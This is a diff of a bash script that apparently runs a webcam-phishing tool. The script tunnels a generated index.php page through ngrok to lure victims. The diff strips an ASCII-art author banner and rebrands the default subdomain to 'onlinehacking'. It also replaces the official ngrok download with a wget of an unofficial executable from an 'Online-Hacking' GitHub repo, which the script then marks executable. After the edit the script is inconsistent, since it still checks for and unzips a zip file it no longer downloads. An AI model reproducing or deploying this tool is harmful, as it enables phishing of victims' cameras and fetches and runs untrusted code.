@@ -8,38 +8,7 @@ printf "\n"
 echo '
                               mmmm
                         so++++oooooo++++osydmM
-                   +ooyhdmNNNNNNNNNNNNmmhyoo++oy
-               +oydmNMMMNmdhyysoooosyyhdmNMMMNmdyo++
-           +ymNMMMMMds/-.`            `.-/sdMMMMMNmy+
-         +dNMNmmMNy:.                      .:yNMmmNMNd+
-         /hNNMddNMd:..                        ..:dMNddMNNh/
-        +mNdNdmMMd.-.                          .-.dMMmdNdNm+
-       NNhNNdMMM:--`     𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι     --:MMMdNNyNN/
-      mMsdMhNMMd.--                            --.dMMNhMdsMm:
-     yMhoNMdMMMh-:-`                          `-:-hMMMdMNohMy:
-     NN/hMMMMMMmshhhy+`                    `+yhhhsmMMMMMMh/NN//
-    yMmdMNMMMMMMNy:----                    ----:yNMMMMMMNMdmMy-
-    NMMNhyMNMMMN/`:shdds:`              `:sddhs:`/NMMMNMyhNMMN//
-  +MNmMdsyMdMMM+`+hMMMMMMd+.  `-  -`  .+dMMMMMMh+`+MMMdMysdMmNM+:
-  hMydMd:/MhMMM``.hMMMMMMMMNdyym``myydNMMMMMMMMh.``MMMhM/:dMdyMh-
-  dMssMd++MhMMM/ `dyMMMNITIMMMMMMM::::MM NITIMMMyd` /MMMhM++dMssMd-
-  dMdNMdmNMhNMMMo.:ssMMMMMMMMMy:MM:yMMMMMMMMMss:.oMMMNhMNmdMNdMd-
-  hMdMMmmMMddMMy   `./ydmmdmMs.mMMm.sMmdmmdy/.`   yMMddMMmmMMdMh-
-  sMmmMNdMMNhMM:`     `..-+/.:mMddMm:.//-..`     `:MMhNMMdNMmmMs-
-    MMMMyNMMhMMs-`         ``+NN::NN+``         `-sMMhMMNyMMMMm//
-       MMNmMMMMMdo:/osys:     `.--.`     :syso/:odMMMMMmmMMds+/
-         shdmNMMMMMNMMMmmd/      ``      /dmmMMMNMMMMMNmNhy//
-             :mMMmMMy:-`                `-:yMMmMMm://:dh+:
-               hMMhNMdo.+-..`` ```` ``..-+.odMNhMMh-yy-dh+:
-               yMModdM. y`-s`:y.//.y:`s-`y -MddoMMy-h+:Nh:+
-                yMM/ooMmdd/oo :o -- o: oo/ddmMoo/MMy-+:hms:
-                hMM:.-oNdhNmNdmh/ss/hmdNmNhdNo-.:MMh-/hms:
-                MM:. /+`h.h:/madbhai/:h.h`+/`-:/MMdymd+/
-                   Mh/`  ..+.h.-y // y-.h.+..-hhNNMNdh+/
-                   Nh+-`  `..-+.//.+-..`  `/dmMMMo/  
-                      h+-``          ``-+hmNhyy+/  
-                     smNmh+-````````-+hmNms++yh  
-                       hdsmyo+oo+oymuwqmkdwa     
+                   +ooyhdmNNNNNNNNNNNNmmhyoo++oy    
                              NNNNNNNN 
                   ---------------------------------  
                  !!        𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι       !! 
@@ -249,7 +218,7 @@ exit 1
 fi
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -322,7 +291,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="madcam$RANDOM"
+default_subdomain="onlinehacking$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
